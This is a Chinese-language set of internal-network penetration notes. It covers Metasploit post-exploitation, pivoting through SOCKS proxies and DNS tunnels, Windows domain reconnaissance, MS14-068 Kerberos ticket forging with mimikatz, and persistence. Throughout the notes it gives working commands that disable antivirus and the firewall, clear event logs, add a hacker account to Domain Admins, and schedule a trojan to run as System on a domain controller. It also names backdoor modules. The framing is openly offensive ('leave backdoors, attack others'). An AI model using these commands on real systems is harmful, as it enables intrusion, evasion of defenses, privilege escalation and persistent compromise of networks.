**内网渗透流程：** 打通->拿权限->留后门->放后台->攻击其他人

 **msf小知识:**

setg->设置全局变量;

监听模块(必须掌握):exploit/multi/handler;

为什么很多时候优选选择meterpreter的载荷?因为这个是msf的集成工具,使用更快捷,方法和工具更多;例

如:run getgui -e一键开启远程连接(3389)

> msfvenom(老版本时payload):  
> -l list列出  
> -f 指定格式输出(常见的格式,aspx,php,asp,server-exe,jsp,war,bash,c,java)  
> -p 指定加载的payload  
> -s 指定文件生成的大小  
> -e 指定编码格式(可以免杀)  
> -i 指定编码次数  
> -b 指定取消字符

进行第一轮编码后可以使用 | 再次进行编码,并且可以换个编码的形式

### 后渗透模块

exploit/Windows/local/payload_inject

设置已经进入的会话,并且是系统权限,设置监听地址

如果是Windows/meterpreter/reverse_http的payload,执行后会生成一个txt窗口,并产生URL,如果是

Windows/meterpreter/reverse_tcp,就会产生一个交互的界面

很多时候得到shell但是发现很多字符串是乱码的,这个时候可以使用`chcp 56001`改变字符编码,改为UTF-8

后渗透模块的快捷使用方式(部分):不需要进入模块里面进行配置,可以直接复制模块的名称,然后再

meterpreter交互界面直接run进行使用

如果直接使用木马等进行攻击,对方靶机在查看系统进程时是非常容易找到的,而后渗透模块是不容易找到

的,后渗透模块通常都会把自己的进程变为txt等等  
 **`run post/Windows/manage/enable_rdp` **一键开启远程桌面连接****  
 **`run post/Windows/manage/killav`** 一键关闭防毒软件

meterpreter中的clearev的作用是将对方靶机中的所有日志全部都清空  
 **`post/multi/recon/local_exploit_suggester`** 本地提权的一个模块,开启后将去对目标靶机进行漏

洞的搜索  
 **`post/windows/gather/local_admin_search_enum`** 是一个对本地用户进行枚举的模块,需要system的权限

 **内网渗透实例:**  
![image](https://image.3001.net/images/20211006/1633510114_615d62e2ad7f6b06a5712.png!small)  
通过ms17_010已经成功进入了内网跳板机(192.168.110.138/172.16.0.10)之中

通过meterpreter工具集输入route查看跳板机的路由,然后再输入ipconfig查看跳板机的IP地址,通过查询ip

地址来找到内网IP段,然后再查询路由表,看路由表中是否存在和内网IP在同一网段的IP地址

 **run post/multi/manage/autoroute** 添加一条本地的路由

meterpreter工具集中的arp可以查看本机与哪些IP有交互

如果想要渗透机,也就是kali可以直接ping通内网,就需要在中间的跳板机上,做一个代理sock.search sock搜

索相关代理的模块(msf5中将socks4a和socks5区分了出来,而msf6中只有socks_proxy,具体是选择socks5还

是4a可以在socks_proxy中进行配置)-`auxiliary/server/socks_proxy`

对代理模块进行配置,首先SRVHOST 设置为本地IP也就是127.0.0.1

配置代理进行扫描会出现很多问题,因为是代理的而不是走路由的,默认所有的连接都可以,只要发包就会响

应,就会默认所有的都是开放的

这个时候就会使用nmap -A,-A的作用就是跑脚本,针对每个端口,只有真正开放的端口才会有脚本行为

这种代理方式并不稳定,是msf自带的代理方式,还可以通过nc端口转换,或者sock4a的代理,还有一些代理的

工具,例如nps(Windows的建议使用socks4a)

创建内网通道的条件,首先得获取到跳板机的shell,并且成功的添加路由,就可以创建socks通道

在使用kali的时候需要配置/etc/proxychains.conf文件,需要将创建的隧道socks,如果需要用到代理的命令就

在命令执行之前加上proxychains,加上proxychains之后执行的命令都是通过代理的

因为是通过代理开启的msf,所以是连接不到本地的数据库的,就不能使用db_nmap,只能够使用msf中的scan

模块  
![image](https://image.3001.net/images/20211006/1633510137_615d62f99bfe30ee56557.png!small)  
如果成功渗透到内网中的主机后发现内网中还有一个内网,但是内网之中的内网的主机可以访问外网,这个

时候就可以使用反弹shell进行攻击

也可以一开始就直接对内网之中的内网的主机进行攻击,控制下来后再往内进行渗透

> meterpreter工具集:execute -f 打开一个shell例如:`execute -f notepad.exe`
>
> meterpreter工具集:search -f [文件名]例如:search -f flag.txt搜索本机上名字为flag.txt的文件
>
> meterpreter工具集:download [文件名]下载文件至文件
>
> meterpreter工具集:packetrecorder 查看目标机器的流量;run packetrecorder -L 查看机器有几个网卡,得知
>
> 到他的网卡的名字,就可以加上-i的参数去监听他的网卡流量

 **post/Windows/gather/credentials/sso** 获取账号的明文密码

 **steal_token [uid]** :伪造uid用户的身份来执行命令

 **protfwd** (端口映射)例子:portfwd add -l 1111 -r 192.168.110.138 -p
3389:把远程的IP192.168.110.138的

3389映射到本地的1111,然后本地的1111的端口就变为192.168.110.138的3389端口了,作用是一样的

当渗透到一台web服务器中,可以输入命令systeminfo查看对应机器是否有安装一些漏洞的补丁.

###  **DNS隧道**

当我们的HTTP,HTTPS这样的上层协议,正反向端口都转发失败的时候,可以尝试DNS隧道.防火墙因为业务

需求,放行DNS流量.在不出网机器构造一个恶意的域名**`( * * * .test.com)` **,本地的DNS服务器无法给出**

 **答复,就会以迭代查询的方式通过互联网定位到查询域的权威** DNS **服务器.最后,这条** DNS**请求就会落到我

们提前搭建好的恶意DNS服务器上  
![image](https://image.3001.net/images/20211006/1633510163_615d63137a263652da1f8.png!small)  
 **DNS隧道搭建工具:iodine,DNS2tcp,DNScat等**

前置准备:需要在自己的主机上使用DNS服务器

### DNS隧道案例:

配置两条域名:A类记录->"DNS.xxx.com"->"172.16.10.233";NS记录->"DNS2tcp.xxx.com"-
>"DNS.xxx.com";最后这条"DNS2tcp.xxx.com"会被"172.16.10.233"的主机解析掉

在主机上运行iodine的服务端,运行之后会多一个虚拟网卡地址  
 **`iodined -f -c -P d1m0n 192.168.0.1 dns2.tcp.xxx.com -DD`**

-f:在前台运行;-c:禁止检查所有传入请求的客户端IP地址;-P:客户端和服务端之间用于验证身份的密码;-D:指

定调试级别,-DD值第二级; **这里的192.168.0.1为自定义局域网虚拟IP地址** ,建议不要与现有网段冲突,DNS填

NS记录  
 **`iodined -f -P d1m0n DNS2tcp.xxx.com -M 200`**

-r:iodine有时会自动将"DNS"隧道切换为UDP隧道,该参数的作用是强制在任何情况下使用DNS隧道;-M:指

定上行主机的大小;-m:调节最大下行分片的大小;-f:在前台运行;-T:指定DNS请求类型TYPE,可选项有

NULL,PRIVATE,TXT,CAME,MX,A;-O:指定数据编码规范;-P:客户端和服务端之间用于验证身份的密码;-L:指定

是否开启懒惰模式,默认开启;-I:指定两个请求之间的时间间隔;

输入这两条命令,我们的DNS隧道就已经搭建好了,因为要在内网横向移动,还需要搭建一个socks代理便于

我们横向移动,这边使用ssh进行代理.  
 **`ssh -N -D 8000 user@192.168.0.1`**

-N:指示SSH不要启动shell;-D:设置动态端口转发,socks代理端口为8000;user:我们服务器上的用

户;192.168.0.1:tun接口上的iodine服务器;

###  **端口转发**

端口转发: **portfwd,nc,ssh,lxc,iptables** (一级代理可以不需要添加路由,直接做portfwd),端口转发并不会改

变转发数据的协议和类型,原来是啥样的,转发之后还是啥样的;dns隧道;icmp隧道

## 内网信息收集

拿到内网靶机的shell,就可以进行本地信息收集

1,分析Windows用户列表  
\-->分析邮件用户,内网[域]邮件用户,通常就是内网[域]用户

2,进程列表  
\-->分析杀毒软件/安全监控工具等  
\-->邮件客户端  
\-->VPN等

3,服务列表  
\-->与安全防范工具有关服务[判断是否可以手动开关等]  
\-->存在问题的服务[权限/漏洞]

4,端口列表  
\-->开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]  
\-->利用端口进行信息收集,建议大家深入挖掘[NETBIOS,SMB等]

5,补丁列表  
\-->分析Windows补丁  
\-->第三方软件[java/Oracle/Flash等]漏洞

6,本机共享  
\-->本机共享访问列表/访问权限  
\-->本机访问的域共享/访问权限

7,本地用户习惯分析  
\-->历史记录  
\-->收藏夹  
\-->文档等

### Windows信息收集

> net user 查看目标当前的用户  
> net group 查看组  
> net localgroup 查看本地组  
> 窃取身份去查看信息:找对要窃取身份的进程号,然后使用steal_token [进程号]窃取对应进程号的身份  
> screenshot 对目标的桌面进行截图保存图片到本地  
>
> 拿到shell之后,执行systeminfo查看打了多少补丁,也可以将systeminfo回显的内容复制,然后利用极光无限这个平台进行安全扫描,查看对方有什么补丁没有安装  
> net share -->查看共享文件夹  
> net view -->查询域内共享  
> net view /domain -->查询域列表  
> net start -->查询当前运行的服务  
> net accounts /domain -->查询域密码策略  
> dsquery/dsget -->获取域内信息  
> nltest /domain_trusts -->获取域信任列表  
> net session -->查看当前会话  
> query user /qwinsta -->当前登录用户  
> net use z: \\\dc01\sysvol -->映射磁盘到本地  
> net share app$=d:\config -->开启一个共享名为app$,在d:\config  
> Tracert 8.8.8.8 -->跟踪路由  
> net view \\\ 192.168.0.1 -->查看共享  
> net config workstation -->当前登陆域  
> net group "domain admins" /domain -->查询域管用户  
> net localgroup administrator /domain -->已加入域本地管理员  
> net group "domain controllers" /domain -->查看域管理器  
> 添加域普通用户:net user hacker P@ssw0rd /add /domain  
> 将普通域用户提升为域管理员用户:net group "Domain Admins" hacker /add /domain  
> dsquery computer -->查看所有的计算机名称  
> net group "Domain Computers" /domain -->下面这条查询的时候,域控不会列出  
> 查看域控制器(多域控制器的时候,而且只能够用在域控制器上)  
> net group "Domain controllers"  
> Windows用ping探测一个网段存活的机器

![image](https://image.3001.net/images/20211006/1633510201_615d633951ec15a08c08b.png!small)  
 **`for /L %I in (1,1,254) do @ping -w 1 -n 192.168.52%I | findstr "TTL="`**

如果使用常规模块拿不到shell的话,以ms17_010为例子:使用**`exploit/windows/smb/ms17_010_eternalblue`
**拿不到目标靶机的shell,就可以尝试使用**`auxiliary/admin/smb/ms17_010_command`
**对目标靶机进行操作,虽然不能拿到目标靶机的shell,但是可以使用这个模块对目标靶机执行命令**

因为是在Windows上执行命令,所以在执行有反斜杠" \ "的命令的时候,需要双写来绕过反斜杠本身的作用" \
",并且,在包含特殊字符,例如双引号",单引号',需要使用 \ 来进行转义

打域控时,必须要了解,域控的最高权限 **是谁**

域控知名漏洞: **ms14_068**

###  **ms14_068域提权漏洞** :

漏洞原理: **服务票据是客户端直接发送给服务器,并请求服务资源的.如果服务器没有向域控DC验证pac的话,那么服务器可以伪造域管的权限来访问服务器**

漏洞利用的前提:
**1.域控没有打ms14_068的补丁;2.攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值,以及用户的suid**

利用过程:获取到用户的hash值和suid,然后导入mimikatz**.为了使我们的票据其作用,首先我们需要将内存中已有的kerberos票据清除,清除方式使用mimikatz.利用ms14_068.exe提权工具生成伪造的kerberos协议认证证书.
**`ms14_068.exe -u \<userName >@\<domainName> -p \<clearPassword> -s
\<userSid> -d
\<domainControlerAddr>`**.然后利用mimikatz.exe将证书写入,从而提升为域管理员,再次列出域控服务器,成功访问域控的C盘,说明普通域用户提权成功.使用PsExec.exe获取shell.#psexec.exe

以管理员权限运行连接域控

使用mimikatz工具:kerberos::list列出票据;kerberos::purge删除票据;berberos::ptc
C:\User\cui22\Desktop\IGI_cui22@st13.com.ccache写入证书;  
msfconsole中的meterpreter工具集:execute->可以在目标机中执行任务

连接域控的C盘: **`net use \\域控的IP\C$ "域控账户的密码" /user:域控账户`**

如果攻击进入域内的机器,但是如果所进入的机器中没有域用户的token是没有办法对域控机器进行攻击

 **域内的所有账号和密码是同步的,如果改了域控的密码,相对的所有机器的密码都会改变**

如果获得访问域控的共享目录的权限,那么就可以上传一个木马,然后使用定时操作的命令设置这个木马将被运行  
 **`schtasks /create /tn "ssss" /tr C:\mao.exe /sc once /st 14:00 /S
192.168.52.138 /RU System /u administrator /p "123.com"`**

/S:域控的IP;/u:用户;/p:域;/st:执行的事件;/tr:执行的程序;/tn:计划任务的名字;/create:创建一个计划任务;

如果域控开启了防火墙,那么可以通过sc命令使得对方关闭防火墙  
 **`sc \\192.168.52.138 create fanghq binpath="net advfirewall set
publicprofile state off"`** :创建一个Windows服务,名为fanghq,执行关闭防火墙的命令  
 **`sc \\192.168.52.138\ start fanghq`** :开启fanghq服务

服务的开启和关闭需要管理员的权限,需要进行欺骗管理员来进行提权

服务的开启和关闭需要管理员的权限,需要进行欺骗管理员来进行提权

也可以导入类似于pr的工具,直接执行命令

绕过防护墙:打死原本端口上的服务,然后再使用那个端口去反弹shell

如果不用proxychains启动msf的话,可以设置msf中的proxies参数  
 **`set proxies sock:IP:端口` **但是用这个代理进行渗透测试时,如果需要使用反向连接,需要开启****

 ** **ReverseAllowProxy选项**`set ReverseAllowProxy
true`**,就可以进行反向的连接了/允许反弹shell至本机,如果是正向的shell是不需要配置此选项的

有时候用copy拷贝文件拷贝到共享是拷贝不了的,可以使用xcopy

提权:exp;bypass uac;窃取token(mimikatz);

UAC:用户账户控制(在域控中使用UAC并不是很靠谱);

如果内网的机器都开启了445端口,可以通过smb服务去进行渗透测试

在/usr/share/doc/python3-impacket/examples中存放着很多用python允许的脚本,这些脚本都是已经免杀了的

其他玩法:msf打进内网,发现其他机器开启445端口:可以使用`exploit/Windows/smb/psexec`的模块,设置smbuser,smbpass;  
msf后门:  
msf自带后门:  
persistence后门->创建注册表;metsvc后门;schtasksabuse->创建计划任务后门;

